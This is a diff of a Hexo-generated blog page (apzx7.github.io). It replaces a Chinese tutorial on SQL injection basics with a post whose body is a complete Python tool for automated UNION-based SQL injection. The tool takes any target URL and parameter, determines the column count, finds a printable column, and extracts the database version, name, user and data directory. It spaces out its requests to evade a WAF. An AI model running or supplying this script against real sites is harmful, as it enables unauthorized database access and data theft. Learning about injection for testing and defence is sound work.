@@ -13,7 +13,7 @@
 
 
 
-<title>SQL注入相关知识 | Apzx7</title>
+<title>sql自动化注入脚本union | Apzx7</title>
 
 
 
@@ -127,76 +127,11 @@
                 <div class="container">
     
     
-        <div class="post-toc">
-    <div class="tocbot-list">
-    </div>
-    <div class="tocbot-list-menu">
-        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
-        <a onclick="go_top()">Back to top</a>
-        <a onclick="go_bottom()">Go to bottom</a>
-    </div>
-</div>
-
-<script>
-    var tocbot_timer;
-    var DEPTH_MAX = 6; // 为 6 时展开所有
-    var tocbot_default_config = {
-        tocSelector: '.tocbot-list',
-        contentSelector: '.post-content',
-        headingSelector: 'h1, h2, h3, h4, h5',
-        orderedList: false,
-        scrollSmooth: true,
-        onClick: extend_click,
-    };
-
-    function extend_click() {
-        clearTimeout(tocbot_timer);
-        tocbot_timer = setTimeout(function() {
-            tocbot.refresh(obj_merge(tocbot_default_config, {
-                hasInnerContainers: true
-            }));
-        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
-    }
-
-    document.ready(function() {
-        tocbot.init(obj_merge(tocbot_default_config, {
-            collapseDepth: 1
-        }));
-    });
-
-    function expand_toc() {
-        var b = document.querySelector('.tocbot-toc-expand');
-        var expanded = b.getAttribute('data-expanded');
-        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
-        tocbot.refresh(obj_merge(tocbot_default_config, {
-            collapseDepth: expanded ? 1 : DEPTH_MAX
-        }));
-        b.innerText = expanded ? 'Expand all' : 'Collapse all';
-    }
-
-    function go_top() {
-        window.scrollTo(0, 0);
-    }
-
-    function go_bottom() {
-        window.scrollTo(0, document.body.scrollHeight);
-    }
-
-    function obj_merge(target, source) {
-        for (var item in source) {
-            if (source.hasOwnProperty(item)) {
-                target[item] = source[item];
-            }
-        }
-        return target;
-    }
-</script>
-    
 
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">SQL注入相关知识</h1>
+            <h1 class="post-title">sql自动化注入脚本union</h1>
             
                 <div class="post-meta">
                     
@@ -205,53 +140,138 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">四月 20, 2025&nbsp;&nbsp;0:00:00</a>
+                        Date: <a href="#">五月 4, 2025&nbsp;&nbsp;21:58:58</a>
                         </span>
                     
-                    
-                        <span class="post-category">
-                    Category:
-                            
-                                <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
-                            
-                        </span>
                     
                 </div>
             
         </header>
 
         <div class="post-content">
-            <h1 id="名字"><a href="#名字" class="headerlink" title="名字"></a>名字</h1><p>重要数据库名：information_schema;<br>重要的表名：columns,tables,<br>SCHEMA_NAME—记录库的信息；<br>table表字段名TABLE_NAME——记录表名；<br>table表字段名TABLE_SCHEMA——记录库名；<br>columns 存储该用户创建的所有数据库的库名、标名和字段名。</p>
-<ul>
-<li>通过 infomation_schema 查询 www_dvwa_com 库里所有的表和字段</li>
-</ul>
-<p>select * from information_schema.<code>COLUMNS</code> where TABLE_SCHEMA&#x3D;’www_dvwa_com’；<br>（where表条件）<br>数据库.表名 这种查询方法是指定某个数据库某个表 <code> </code> 这个符号可以忽略不用；</p>
-<ul>
-<li>查询某个库某个表的字段可以这样查询</li>
-</ul>
-<p>select * from information_schema.COLUMNS where</p>
-<p>TABLE_SCHEMA&#x3D;’www_dvwa_com’ and TABLE_NAME&#x3D;’users’<br>（’*’为通配符）</p>
-<h1 id="sql注释符"><a href="#sql注释符" class="headerlink" title="sql注释符"></a>sql注释符</h1><p>  ‘# ’单行注释<br>注意与 url 中的#区分，常编码为%23</p>
-<p>–空格&#x2F;+ 单行注释 注意为短线短线空格</p>
-<p>&#x2F;<em>（）</em>&#x2F; 多行注释 至少存在俩处的注入</p>
-<p>&#x2F;* * &#x2F;常用来作为空格；</p>
-<h1 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h1><p>SQL 注入分类：按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种：</p>
-<p>UNION query SQL injection（可联合查询注入）[[1.5 UNION联合注入]]</p>
-<p>Stacked queries SQL injection（可多语句查询注入）堆叠查询Boolean-based blind SQL injection（布尔型注入）</p>
-<p>Error-based SQL injection（报错型注入）</p>
-<p>Time-based blind SQL injection（基于时间延迟注入）</p>
-<h1 id="接受请求类型区分"><a href="#接受请求类型区分" class="headerlink" title="接受请求类型区分"></a>接受请求类型区分</h1><p>GET 注入：</p>
-<p>GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要URL 编码</p>
-<p>POST 注入：</p>
-<p>POST 请求参数是放在请求 body 里的，长度没有限制</p>
-<p>COOKIE 注入：</p>
-<p>cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取</p>
-<h1 id="注入数据类型的区分"><a href="#注入数据类型的区分" class="headerlink" title="注入数据类型的区分"></a>注入数据类型的区分</h1><p>int 整型</p>
-<p>select * from users where id&#x3D;1</p>
-<p>sting 字符型</p>
-<p>select * from users where username&#x3D;’admin’</p>
-<p>like 搜索型</p>
-<p>select * from news where title like ‘%标题%’</p>
+            <p>import requests<br>import time<br>from urllib.parse import urljoin, quote</p>
+<p>class UnionInjector:<br>    def <strong>init</strong>(self, url):<br>        self.url &#x3D; url<br>        self.headers &#x3D; {<br>            ‘User-Agent’: ‘Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36’<br>        }<br>        self.timeout &#x3D; 10<br>        self.delay &#x3D; 1  # 请求间隔，避免触发WAF</p>
+<pre><code>def test_columns(self, param_name, max_columns=10):
+    print(&quot;[*] 开始测试列数...&quot;)
+    for i in range(1, max_columns + 1):
+        # 构造NULL联合查询
+        nulls = &#39;,&#39;.join([&#39;NULL&#39;] * i)
+        payload = f&quot;&#39; UNION SELECT &#123;nulls&#125;-- -&quot;
+        encoded_payload = quote(payload)
+        
+        try:
+            response = self.send_request(param_name, encoded_payload)
+            
+            # 如果页面正常返回，可能找到正确的列数
+            if response and response.status_code == 200:
+                print(f&quot;[+] 可能的列数: &#123;i&#125;&quot;)
+                print(f&quot;[+] 使用的Payload: &#123;payload&#125;&quot;)
+                return i
+                
+            time.sleep(self.delay)  # 请求间隔
+            
+        except Exception as e:
+            print(f&quot;[-] 测试列数 &#123;i&#125; 时出错: &#123;str(e)&#125;&quot;)
+            continue
+    
+    return None
+
+def test_string_column(self, param_name, num_columns):
+    print(&quot;\n[*] 开始测试字符串列...&quot;)
+    test_str = &#39;TRAE&#39;
+    
+    for i in range(1, num_columns + 1):
+        # 构造测试字符串的查询
+        columns = [&#39;NULL&#39;] * num_columns
+        columns[i-1] = f&quot;&#39;&#123;test_str&#125;&#39;&quot;
+        payload = f&quot;&#39; UNION SELECT &#123;&#39;,&#39;.join(columns)&#125;-- -&quot;
+        encoded_payload = quote(payload)
+        
+        try:
+            response = self.send_request(param_name, encoded_payload)
+            
+            if response and response.status_code == 200:
+                if test_str in response.text:
+                    print(f&quot;[+] 发现字符串列: &#123;i&#125;&quot;)
+                    print(f&quot;[+] 使用的Payload: &#123;payload&#125;&quot;)
+                    return i
+                    
+            time.sleep(self.delay)
+            
+        except Exception as e:
+            print(f&quot;[-] 测试字符串列 &#123;i&#125; 时出错: &#123;str(e)&#125;&quot;)
+            continue
+    
+    return None
+
+def extract_data(self, param_name, num_columns, string_column):
+    print(&quot;\n[*] 开始提取数据...&quot;)
+    
+    # 常用的数据库信息查询
+    queries = [
+        &quot;version()&quot;,           # 数据库版本
+        &quot;database()&quot;,          # 当前数据库
+        &quot;user()&quot;,              # 当前用户
+        &quot;@@datadir&quot;,          # 数据库路径
+        &quot;system_user()&quot;,       # 系统用户
+        &quot;session_user()&quot;      # 会话用户
+    ]
+    
+    for query in queries:
+        columns = [&#39;NULL&#39;] * num_columns
+        columns[string_column-1] = query
+        payload = f&quot;&#39; UNION SELECT &#123;&#39;,&#39;.join(columns)&#125;-- -&quot;
+        encoded_payload = quote(payload)
+        
+        try:
+            response = self.send_request(param_name, encoded_payload)
+            
+            if response and response.status_code == 200:
+                print(f&quot;[+] &#123;query&#125;: &#123;response.text&#125;&quot;)
+                
+            time.sleep(self.delay)
+            
+        except Exception as e:
+            print(f&quot;[-] 提取 &#123;query&#125; 时出错: &#123;str(e)&#125;&quot;)
+            continue
+
+def send_request(self, param_name, payload):
+    test_url = f&quot;&#123;self.url&#125;?&#123;param_name&#125;=&#123;payload&#125;&quot;
+    return requests.get(
+        test_url,
+        headers=self.headers,
+        timeout=self.timeout
+    )
+</code></pre>
+<p>def main():<br>    print(“UNION联合注入测试工具”)<br>    print(“&#x3D;” * 50)</p>
+<pre><code>while True:
+    url = input(&quot;\n请输入目标URL (输入q退出): &quot;)
+    if url.lower() == &#39;q&#39;:
+        break
+        
+    if not url.startswith((&#39;http://&#39;, &#39;https://&#39;)):
+        url = &#39;http://&#39; + url
+        
+    param_name = input(&quot;请输入参数名: &quot;)
+    
+    injector = UnionInjector(url)
+    
+    # 1. 测试列数
+    num_columns = injector.test_columns(param_name)
+    if not num_columns:
+        print(&quot;[-] 未能确定列数&quot;)
+        continue
+        
+    # 2. 测试字符串列
+    string_column = injector.test_string_column(param_name, num_columns)
+    if not string_column:
+        print(&quot;[-] 未能找到字符串列&quot;)
+        continue
+        
+    # 3. 提取数据
+    injector.extract_data(param_name, num_columns, string_column)
+</code></pre>
+<p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>    main()</p>
 
         </div>
 
@@ -266,7 +286,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://apzx7.github.io/2025/04/20/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">http://apzx7.github.io/2025/04/20/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</a></span>
+                        <span><a href="http://apzx7.github.io/2025/05/04/sql%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%ACunion/">http://apzx7.github.io/2025/05/04/sql%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%ACunion/</a></span>
                     </p>
                 
                 
@@ -290,9 +310,7 @@
                 <span class="tag">
                     
                     
-                        <a href="/tags/Hexo/"># Hexo</a>
-                    
-                        <a href="/tags/%E6%95%99%E7%A8%8B/"># 教程</a>
+                        <a href="/tags/posts/"># posts</a>
                     
                         
                 </span>
@@ -305,10 +323,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2025/05/04/sql%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%ACunion/">sql自动化注入脚本union</a>
             
-            
-            <a class="next" rel="next" href="/2025/04/13/hello-world/">Hello World</a>
+            <a class="next" rel="next" href="/2025/04/20/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">SQL注入相关知识</a>
             
         </section>
 
